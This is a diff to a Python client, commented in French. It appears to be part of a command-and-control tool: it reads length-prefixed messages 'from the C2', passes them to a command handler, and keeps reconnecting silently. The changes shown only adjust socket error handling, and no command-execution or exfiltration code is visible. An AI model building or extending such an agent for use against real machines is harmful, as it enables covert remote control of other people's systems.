@@ -1,4 +1,4 @@
-#Client principal
+#point d'entree pour les deux types de client
 import socket
 import json
 import struct
@@ -51,24 +51,40 @@ def send_bytes(sock, blob: bytes, meta: dict) -> None:
     sock.sendall(len(blob).to_bytes(4, "big") + blob)
 
 
-def _receiveN(sock, n: int) -> bytes:
+def _receiveN(sock, n: int) -> bytes | None:
+    """Pour lire n octets d'un message de C2"""
     buf = b""
     while len(buf) < n:
         chunk = sock.recv(n - len(buf))
         if not chunk:
-            raise ConnectionError("connexion coupée")
+            return None
         buf += chunk
     return buf
 
 
 def receiveBytes(sock) -> bytes:
-    blob_len = int.from_bytes(_receiveN(sock, 4), "big")
-    return _receiveN(sock, blob_len)
+    raw_len = _receiveN(sock, 4)
+    if raw_len is None:
+        raise ConnectionError("probleme de connexion")
+    blob_len = int.from_bytes(raw_len, "big")
+    data = _receiveN(sock, blob_len)
+    if data is None:
+        raise ConnectionError("donnees incompletes")
+    return data
 
 
 def receiveMessage(sock) -> dict:
-    msg_len = int.from_bytes(_receiveN(sock, 4), "big")
-    return json.loads(_receiveN(sock, msg_len).decode(ENCODING))
+    """Pour recevoir un msg du C2"""
+
+    raw_len = _receiveN(sock, 4)
+    if raw_len is None:
+        raise ConnectionError("probleme de connexion")
+    
+    data = _receiveN(sock, int.from_bytes(raw_len, "big"))
+
+    if data is None:
+        raise ConnectionError("probleme de connexion")
+    return json.loads(data.decode(ENCODING))
 
 
 #Config des commandes exe
@@ -180,6 +196,8 @@ def main():
                     msg = receiveMessage(sock)
                     handle_command(sock, msg)
 
+        except (ConnectionError, ConnectionRefusedError, OSError, json.JSONDecodeError):
+            time.sleep(RETRY_DELAY)
         except Exception:
             time.sleep(RETRY_DELAY)
 
